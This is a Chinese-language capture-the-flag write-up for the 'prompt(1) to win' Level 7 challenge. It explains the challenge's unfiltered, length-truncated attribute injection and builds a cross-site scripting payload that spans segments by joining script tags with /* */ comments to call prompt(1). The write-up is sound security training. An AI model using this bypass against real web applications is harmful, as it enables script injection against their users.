## [[prompt(1) to win](http://prompt.ml)] [[Level 7 - Length](http://prompt.ml/7)] [[解题报告](http://exp-blog.com/2019/03/23/pid-3672/)]

------

## 题目

```javascript
function escape(input) {
    // pass in something like dog#cat#bird#mouse...
    var segments = input.split('#');
    return segments.map(function(title) {
        // title can only contain 12 characters
        return '<p class="comment" title="' + title.slice(0, 12) + '"></p>';
    }).join('\n');
}
```

## 解题报告

题目代码很好理解：

- 使用 `#` 切割 input 的字符串，切割后的子串会被顺次放到若干个 `<p>` 标签的 `title` 属性中
- 子串长度若超过 12 则会被截断
- input 内容没有做任何过滤

可以使用这个探针看到前面的分析效果：

`11#2222#333333#44444444#5555555555#6666666666666666666666666#"><img src=0`

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2007%20-%20Length/imgs/01.png)


------------

需知道 javascript 代码有个特点：

- 在 HTML 语境中，`<script>` 和 `</script>` 标签之间的内容默认视为 js 代码
- js 代码换行后依然会自动拼接并生效
- js 代码内容之间的注释会被自动忽略

因此对于这种限制长度的注入点，可以搭配 `<script>` 和多行注释 `/* */` 进行绕过。

结合 `title` 属性值长度为 12 的限制进行考虑，可以尝试在本地构造这样的 HTML 代码，成功触发 prompt 事件：

```html
<p class="comment" title=""><script>/*"></p>
<p class="comment" title="*/prompt/*"></p>
<p class="comment" title="*/(1)/*"></p>
<p class="comment" title="*/</script> "></p>
```

> 注意： `<script>` 和 `</script>` 标签用于声明 js 代码的范围，唯独这两个标签不能从中间断开到两行，否则多行注释 `/* */` 就不会起作用了。另外我在测试 payload 的时候，也尝试过 `<!-- -->` HTML 注释，但是尖括号会造成标签错位导致注入失败，有兴趣的同学可以研究下。

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2007%20-%20Length/imgs/02.png)

从前面构造的 HTML 代码中提取每一行的 `title` 属性值，使用 `#` 拼接，就得到最终 payload 如下，完成挑战：

`"><script>/*#*/prompt/*#*/(1)/*#*/</script>`

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2007%20-%20Length/imgs/03.png)

------

## 版权声明

　[![Copyright (C) 2016-2019 By EXP](https://img.shields.io/badge/Copyright%20(C)-2016~2019%20By%20EXP-blue.svg)](http://exp-blog.com)　[![License: GPL v3](https://img.shields.io/badge/License-GPL%20v3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
  

- Site: [http://exp-blog.com](http://exp-blog.com) 
- Mail: <a href="mailto:289065406@qq.com?subject=[EXP's Github]%20Your%20Question%20（请写下您的疑问）&amp;body=What%20can%20I%20help%20you?%20（需要我提供什么帮助吗？）">289065406@qq.com</a>


------
